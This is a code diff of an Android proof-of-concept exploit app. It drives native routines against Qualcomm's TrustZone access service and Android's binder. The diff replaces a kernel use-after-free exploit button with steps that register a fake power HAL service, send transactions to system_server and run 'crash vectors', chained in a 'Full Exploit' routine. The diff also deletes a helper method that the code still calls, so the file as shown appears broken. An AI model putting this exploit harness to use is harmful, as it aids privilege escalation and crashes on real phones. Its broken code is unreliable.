@@ -11,8 +11,6 @@ import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
-import android.os.ParcelFileDescriptor;
-import android.os.RemoteException;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ScrollView;
@@ -42,7 +40,7 @@ public class MainActivity extends AppCompatActivity {
     private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
 
     private TextView tvStatus, tvLog;
-    private Button btnStart, btnStop, btnAddOnly, btnStartServer, btnKernelExploit;
+    private Button btnStart, btnStop, btnAddOnly, btnStartServer, btnSendTxn, btnCrash;
     private Handler handler = new Handler(Looper.getMainLooper());
     private StringBuilder logBuilder = new StringBuilder();
     private IMinkSocketFd tzService;
@@ -56,10 +54,26 @@ public class MainActivity extends AppCompatActivity {
         System.loadLibrary("pocjni");
     }
 
-    public static native int nativeGetHwServicemanagerPid();
-    public static native int nativeExploit(String outputPath, String logPath);
+    // Native methods
+    public static native void nativeSetCallback(MainActivity activity);
     public static native int nativeAddServiceOnly(String serviceName);
     public static native int nativeStartServer(int handle);
+    public static native void nativeRegisterAndServe(String serviceName);
+    public static native void nativeSendTransactionToSystem();
+    public static native void nativeCrashVectors();
+    public static native String nativeGetKernelInfo();
+
+    // コールバック用（JNIから呼ばれる）
+    public void appendLog(String msg) {
+        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
+        final String line = "[" + ts + "] " + msg + "\n";
+        logBuilder.append(line);
+        handler.post(() -> {
+            tvLog.append(line);
+            View parent = (View) tvLog.getParent();
+            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
+        });
+    }
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -98,7 +112,11 @@ public class MainActivity extends AppCompatActivity {
         btnStop = findViewById(R.id.btn_stop);
         btnAddOnly = findViewById(R.id.btn_add_only);
         btnStartServer = findViewById(R.id.btn_start_server);
-        btnKernelExploit = findViewById(R.id.btn_kernel_exploit);
+        btnSendTxn = findViewById(R.id.btn_send_txn);
+        btnCrash = findViewById(R.id.btn_crash);
+
+        // JNI コールバックを設定
+        nativeSetCallback(this);
 
         requestPermissions();
 
@@ -157,30 +175,26 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-        btnKernelExploit.setOnClickListener(v -> {
-            if (!isTesting.get()) {
-                isTesting.set(true);
-                enableButtons(false, true);
-                stopRequested.set(false);
-                testThread = new Thread(() -> {
-                    appendLog("=== Starting Kernel UAF Exploit ===");
-                    String outputPath = getDumpDir() + "/cve_result.txt";
-                    String logPath = getDumpDir() + "/binder_traffic.log";
-                    int result = nativeExploit(outputPath, logPath);
-                    appendLog("[*] Exploit result: " + (result == 1 ? "SUCCESS" : "FAILED"));
-                    updateStatus("Exploit " + (result == 1 ? "succeeded" : "failed"));
-                    isTesting.set(false);
-                    enableButtons(true, false);
-                    saveLog();
-                });
-                testThread.start();
-            }
+        btnSendTxn.setOnClickListener(v -> {
+            appendLog("Sending transaction to system_server...");
+            nativeSendTransactionToSystem();
+        });
+
+        btnCrash.setOnClickListener(v -> {
+            appendLog("Running crash vectors...");
+            nativeCrashVectors();
+        });
+
+        // 自動実行オプション：サービス登録＋サーバー起動を一括で行う
+        findViewById(R.id.btn_auto_serve).setOnClickListener(v -> {
+            String name = "android.hardware.power.IPower";
+            appendLog("Auto: registering and serving '" + name + "'");
+            nativeRegisterAndServe(name);
+            appendLog("Auto: done.");
         });
 
         appendLog("App started.");
-        appendLog("Press 'Start Full Exploit' for automatic attack.");
-        appendLog("Or use 'Add Service' + 'Start Server' manually.");
-        appendLog("New: 'Kernel Exploit' attempts UAF escalation.");
+        appendLog("Use buttons to add service, start server, or send transaction.");
     }
 
     private void requestPermissions() {
@@ -228,7 +242,8 @@ public class MainActivity extends AppCompatActivity {
             btnStop.setEnabled(stopEnabled);
             btnAddOnly.setEnabled(startEnabled);
             btnStartServer.setEnabled(startEnabled);
-            btnKernelExploit.setEnabled(startEnabled);
+            btnSendTxn.setEnabled(startEnabled);
+            btnCrash.setEnabled(startEnabled);
         });
     }
 
@@ -236,45 +251,51 @@ public class MainActivity extends AppCompatActivity {
         appendLog("========================================");
         appendLog("===== Full Exploit Starting =====");
 
-        int pid = nativeGetHwServicemanagerPid();
-        appendLog("[*] hwservicemanager PID: " + pid);
+        // まずサービスを登録
+        String serviceName = "android.hardware.power.IPower";
+        int handle = nativeAddServiceOnly(serviceName);
+        if (handle < 0) {
+            appendLog("Failed to add service");
+            updateStatus("Failed");
+            isTesting.set(false);
+            enableButtons(true, false);
+            return;
+        }
+        lastHandle = handle;
 
-        String outputPath = getDumpDir() + "/cve_result.txt";
-        String logPath = getDumpDir() + "/binder_traffic.log";
-        appendLog("[*] Output: " + outputPath);
-        appendLog("[*] Log: " + logPath);
-
-        int result = nativeExploit(outputPath, logPath);
-        appendLog("[*] Exploit result: " + (result == 1 ? "SUCCESS" : "FAILED"));
-
-        if (result == 1) {
-            appendLog("[+] Check " + outputPath + " for results");
-            String content = readFile(outputPath);
-            if (content != null) {
-                appendLog("[CONTENT]\n" + content);
-            }
+        // サーバーを起動
+        int pid = nativeStartServer(handle);
+        if (pid < 0) {
+            appendLog("Failed to start server");
+            updateStatus("Failed");
+            isTesting.set(false);
+            enableButtons(true, false);
+            return;
         }
 
-        appendLog("========================================");
-        appendLog("===== Exploit Finished =====");
+        // システムにトランザクションを送信（system_server を刺激）
+        appendLog("Sending transaction to system...");
+        nativeSendTransactionToSystem();
+
+        // クラッシュベクターも試す（オプション）
+        appendLog("Running crash vectors...");
+        nativeCrashVectors();
+
+        // 待機（最大60秒）
+        appendLog("Waiting for system_server to call (60s)...");
+        for (int i = 0; i < 60; i++) {
+            if (stopRequested.get()) break;
+            try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
+            // チェック用：ログを出力
+            if (i % 10 == 0) appendLog("Waiting... " + i + "s");
+        }
+
+        appendLog("Exploit finished.");
         updateStatus("Done");
         isTesting.set(false);
         enableButtons(true, false);
         saveLog();
         finishTest();
-    }
-
-    private String readFile(String path) {
-        try {
-            java.io.FileInputStream fis = new java.io.FileInputStream(path);
-            byte[] buf = new byte[8192];
-            int n = fis.read(buf);
-            fis.close();
-            if (n > 0) return new String(buf, 0, n, StandardCharsets.UTF_8);
-        } catch (Exception e) {
-            appendLog("Read error: " + e.getMessage());
-        }
-        return null;
     }
 
     private String getDumpDir() {
@@ -284,21 +305,6 @@ public class MainActivity extends AppCompatActivity {
         }
         File dir = getFilesDir();
         return dir.getAbsolutePath();
-    }
-
-    private void appendLog(final String msg) {
-        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
-        final String line = "[" + ts + "] " + msg + "\n";
-        logBuilder.append(line);
-        handler.post(() -> {
-            tvLog.append(line);
-            View parent = (View) tvLog.getParent();
-            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
-        });
-    }
-
-    private void updateStatus(final String status) {
-        handler.post(() -> tvStatus.setText(status));
     }
 
     private void saveLog() {
